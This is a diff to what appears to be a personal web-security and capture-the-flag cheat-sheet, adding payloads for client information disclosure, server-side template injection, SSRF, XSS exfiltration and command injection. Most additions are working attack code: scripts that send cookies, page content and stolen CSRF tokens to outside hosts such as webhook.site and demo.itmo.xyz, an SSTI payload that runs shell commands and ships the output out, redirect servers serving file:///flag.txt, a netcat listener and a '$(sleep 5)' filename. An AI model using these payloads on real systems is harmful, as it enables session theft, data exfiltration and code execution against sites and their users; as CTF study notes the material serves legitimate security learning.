@@ -10,6 +10,26 @@ https://portswigger-labs.net/hackability/inspector/index.php?input=window
 
 https://snyk.io/vuln/
 
+# client information disclosure
+
+[Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)
+
+```python
+@app.route('/', methods=['GET', 'HEAD', 'POST'])
+def index():
+    # e.g. Vary, Origin
+    print(request.headers)
+    print(request.args)
+    print(json.dumps(request.json))
+    return "OK"
+
+if _name__ == "__main__":
+    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
+```
+
+- `user-agent curl/7.19.3` => vulnerable version
+    - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
+
 # prototype pollution
 
 - [GitHub \- Kirill89/prototype\-pollution\-explained: Prototype Pollution in JavaScript](https://github.com/Kirill89/prototype-pollution-explained)
@@ -67,6 +87,18 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
 ```
 
+# server-side template injection (SSTI)
+
+```html
+<script>
+// Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
+fetch('http://localhost:5000/',{
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
+</script>
+```
+
 # server-side request forgery (SSRF)
 
 - Headers
@@ -74,10 +106,37 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 - Request URL with CRLF + Headers
     - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
         - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
-- Client information disclosure
-    - Using webhook.site: `user-agent curl/7.19.3` => vulnerable version
-        - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
 - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+
+```bash
+curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
+```
+- https://glitch.com
+    ```javascript
+    const express = require("express");
+    const app = express();
+
+    app.get("/", (request, response) => {
+      response.redirect(301, 'file:///flag.txt')
+    });
+
+    const listener = app.listen(process.env.PORT, () => {
+      console.log("Your app is listening on port " + listener.address().port);
+    });
+    ```
+- https://pipedream.com/
+    - https://docs.pipedream.com/workflows/steps/code/#making-http-requests-from-your-workflow
+    - Workflow = HTTP trigger > NodeJS
+    ```javascript
+    async(event, steps) => {
+        $respond({
+          status: 301,
+          headers: { "Location": "file:///flag.txt" }
+        });
+    }
+    ```
+- https://www.netlify.com/blog/2018/09/13/how-to-run-express.js-apps-with-netlify-functions/
+- https://devcenter.heroku.com/articles/getting-started-with-nodejs
 
 ### Reverse DNS checks
 
@@ -129,15 +188,30 @@ xmlhttp.send(null);
 </script>
 
 <!-- Vanilla -->
-<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org/?content=" + document.body.InnerHTML, true); xhr.send(); </script>
 nc -lvp 1000 | tee log.txt
-<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org:1000/?content=" + document.body.InnerHTML, true); xhr.send(); </script>
+<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org:1000/?content=" + btoa(document.body.InnerHTML), true); xhr.send(); </script>
+<script>
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function() {
+    document.location="http://vps_ip:23334/?"+btoa(xmlhttp.responseText);
+}
+xmlhttp.open("GET","http://127.0.0.1:5000/notes?name=Ann Cobb", true);
+xmlhttp.send();
+</script>
 
 <!-- jQuery -->
 <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script><script> var x = $('body').html().toString(); $.post('http://foo/catcher.php', x); </script>
 
 <!-- ES6 -->
 <script>fetch('https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(document.cookie));</script>
+<script>
+fetch('http://localhost:5000/notes?name=Angela%20Turner').then(response => response.text()).then(
+data => fetch("http://demo.itmo.xyz", {
+    method: "POST", 
+    headers: {
+        'Content-Type': 'application/json'
+    },"body": JSON.stringify(data)})).then(response => document.write(response));
+</script>
 ```
 
 LFI:
@@ -290,7 +364,11 @@ j:[{"id":1,"body":["foo'"]}]
 - https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
 - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
-# command injection
+# command injection 
+
+```
+filename="'$(sleep 5)'a.gif"
+```
 
 - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
 - [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
